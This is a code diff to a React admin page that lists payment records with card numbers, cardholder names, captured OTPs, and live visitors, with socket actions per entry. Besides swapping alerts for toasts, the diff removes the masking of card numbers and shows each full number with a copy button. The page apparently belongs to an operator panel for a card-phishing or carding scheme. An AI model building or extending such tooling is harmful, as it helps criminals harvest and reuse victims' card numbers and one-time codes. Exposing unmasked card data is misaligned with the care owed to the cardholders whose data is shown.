@@ -1,7 +1,9 @@
+
 import React, { useState, useEffect } from 'react';
-import { MoreHorizontal, Check, X, AlertTriangle, Wifi, WifiOff } from 'lucide-react';
+import { MoreHorizontal, Check, X, AlertTriangle, Wifi, WifiOff, Copy } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { io, Socket } from 'socket.io-client';
+import { useToast } from '@/hooks/use-toast';
 
 interface PaymentData {
   id: string;
@@ -43,6 +45,7 @@ const Admin = () => {
   const [otps, setOtps] = useState<OtpData[]>([]);
   const [activeDropdown, setActiveDropdown] = useState<string | null>(null);
   const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>([]);
+  const { toast } = useToast();
 
   useEffect(() => {
     try {
@@ -173,13 +176,21 @@ const Admin = () => {
     try {
       if (!socket) {
         console.error('Socket not connected');
-        alert('Connection lost. Please refresh the page.');
+        toast({
+          title: "Connection Error",
+          description: "Connection lost. Please refresh the page.",
+          variant: "destructive",
+        });
         return;
       }
 
       if (!isConnected) {
         console.error('Socket not connected');
-        alert('Not connected to server. Please wait for reconnection.');
+        toast({
+          title: "Connection Error",
+          description: "Not connected to server. Please wait for reconnection.",
+          variant: "destructive",
+        });
         return;
       }
 
@@ -214,7 +225,11 @@ const Admin = () => {
       setActiveDropdown(null);
     } catch (error) {
       console.error('Error handling action:', error);
-      alert('An error occurred. Please try again.');
+      toast({
+        title: "Error",
+        description: "An error occurred. Please try again.",
+        variant: "destructive",
+      });
     }
   };
 
@@ -224,16 +239,20 @@ const Admin = () => {
     ));
   };
 
-  const formatCardNumber = (cardNumber: string) => {
-    try {
-      if (!cardNumber || cardNumber.length < 4) {
-        return '**** **** **** ****';
-      }
-      return `**** **** **** ${cardNumber.slice(-4)}`;
-    } catch (error) {
-      console.error('Error formatting card number:', error);
-      return '**** **** **** ****';
-    }
+  const copyToClipboard = (text: string) => {
+    navigator.clipboard.writeText(text).then(() => {
+      toast({
+        title: "Copied!",
+        description: "Card number copied to clipboard",
+      });
+    }).catch((error) => {
+      console.error('Error copying to clipboard:', error);
+      toast({
+        title: "Error",
+        description: "Failed to copy to clipboard",
+        variant: "destructive",
+      });
+    });
   };
 
   const getStatusColor = (status: string) => {
@@ -394,7 +413,17 @@ const Admin = () => {
                         <div className="text-xs text-gray-500">{payment.billingDetails.country}</div>
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
-                        {formatCardNumber(payment.cardNumber)}
+                        <div className="flex items-center gap-2">
+                          <span className="text-green-400">{payment.cardNumber}</span>
+                          <Button
+                            variant="ghost"
+                            size="sm"
+                            onClick={() => copyToClipboard(payment.cardNumber)}
+                            className="h-6 w-6 p-0 text-gray-400 hover:text-white"
+                          >
+                            <Copy className="h-3 w-3" />
+                          </Button>
+                        </div>
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap text-sm">
                         {payment.cardName}
